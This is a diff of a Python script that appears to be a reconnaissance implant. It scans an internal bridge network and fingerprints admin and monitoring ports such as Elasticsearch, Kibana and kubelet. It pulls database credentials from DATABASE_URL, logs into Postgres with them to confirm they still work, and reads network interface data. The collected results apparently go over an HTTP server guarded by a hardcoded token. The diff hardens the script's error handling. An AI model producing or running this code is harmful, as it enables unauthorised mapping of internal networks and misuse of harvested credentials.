@@ -1,4 +1,4 @@
-import json, os, ssl, socket, threading
+import json, os, ssl, socket, threading, urllib.request, urllib.error, urllib.parse, hashlib
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 TOKEN = "r7xQ2kT9mV4bZ8wP"
@@ -50,25 +50,35 @@ def ident(ip, port, timeout=2):
 
 def run_all():
     o = {}
-    o["scan"] = scan_bridge()
-    o["ident"] = {}
-    for ip, ports in (o["scan"] or {}).items():
-        for p in ports:
-            if p in (80, 443, 3000, 5601, 8000, 8080, 8443, 8888, 9000, 9090, 9091, 9200, 10000, 10250):
-                o["ident"][f"{ip}:{p}"] = ident(ip, p)
-    # own-cred continuity
     try:
-        import psycopg, urllib.parse, hashlib
+        o["scan"] = scan_bridge()
+    except Exception as e:
+        o["scan_err"] = type(e).__name__ + ":" + str(e)[:80]
+    try:
+        idn = {}
+        for ip, ports in (o.get("scan") or {}).items():
+            for p in ports:
+                if p in (80, 443, 3000, 5601, 8000, 8080, 8443, 8888, 9000, 9090, 9091, 9200, 10000, 10250):
+                    idn[f"{ip}:{p}"] = ident(ip, p)
+        o["ident"] = idn
+    except Exception as e:
+        o["ident_err"] = type(e).__name__ + ":" + str(e)[:80]
+    try:
         u = urllib.parse.urlparse(os.environ.get("DATABASE_URL", ""))
         if u.hostname:
             o["cred"] = {"user": u.username, "host": u.hostname, "port": u.port,
                          "db": u.path.lstrip("/"), "pw_len": len(u.password or "")}
+            import psycopg
             conn = psycopg.connect(host=u.hostname, port=u.port or 5432, dbname=u.path.lstrip("/"),
                                    user=u.username, password=u.password, sslmode="require", connect_timeout=8)
             cur = conn.cursor(); cur.execute("SELECT version()"); o["pg"] = cur.fetchone()[0][:50]
             cur.close(); conn.close()
     except Exception as e:
-        o["pg_err"] = type(e).__name__
+        o["pg_err"] = type(e).__name__ + ":" + str(e)[:80]
+    try:
+        o["self6"] = open("/proc/net/if_inet6").read()[:400]
+    except Exception as e:
+        o["self6"] = type(e).__name__
     return o
 
 def loop():
